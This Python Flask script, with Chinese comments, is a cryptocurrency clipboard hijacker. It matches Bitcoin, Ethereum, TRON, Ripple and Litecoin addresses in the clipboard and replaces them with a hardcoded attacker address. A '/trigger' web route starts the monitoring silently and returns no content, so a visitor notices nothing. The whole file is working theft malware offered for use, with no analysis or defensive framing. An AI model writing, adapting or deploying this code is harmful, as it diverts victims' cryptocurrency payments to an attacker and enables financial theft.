from flask import Flask
import pyperclip
import re
import threading
import time  # 修复剪贴板监控的休眠错误

# 替换的目标地址
ATTACKER_ADDRESS = "panteklu"


def is_crypto_address(address):
    """
    判断给定地址是否为加密货币地址。
    """
    patterns = {
        "Bitcoin (Legacy)": r"^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$",
        "Ethereum": r"^0x[a-fA-F0-9]{40}$",
        "TRON": r"^T[a-zA-Z0-9]{33}$",
        "Ripple": r"^r[a-zA-Z0-9]{23,43}$",
        "Litecoin": r"^[LM3][a-km-zA-HJ-NP-Z1-9]{26,35}$",
    }
    for regex in patterns.values():
        if re.fullmatch(regex, address):
            return True
    return False


def monitor_clipboard():
    """
    监控剪贴板内容，并替换符合加密货币地址规则的内容。
    """
    previous_content = ""
    while True:
        try:
            clipboard_content = pyperclip.paste()  # 获取剪贴板内容
            if clipboard_content != previous_content and is_crypto_address(clipboard_content):
                pyperclip.copy(ATTACKER_ADDRESS)  # 替换剪贴板内容
                previous_content = ATTACKER_ADDRESS
                print(f"Replaced clipboard content: {clipboard_content} -> {ATTACKER_ADDRESS}")
            else:
                previous_content = clipboard_content
            time.sleep(0.5)  # 防止高频率运行
        except Exception as e:
            print(f"Error monitoring clipboard: {e}")
            time.sleep(1)


app = Flask(__name__)

@app.route("/", methods=["GET"])
def home():
    """
    根路径响应，避免出现 404 错误。
    """
    return "Welcome to the clipboard monitoring service!", 200


@app.route("/trigger", methods=["GET"])
def trigger():
    """
    链接点击触发剪贴板监控逻辑。
    """
    threading.Thread(target=monitor_clipboard).start()
    print("Trigger triggered! Clipboard monitoring started.")
    return "", 204  # 返回 204 No Content，避免显示内容


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
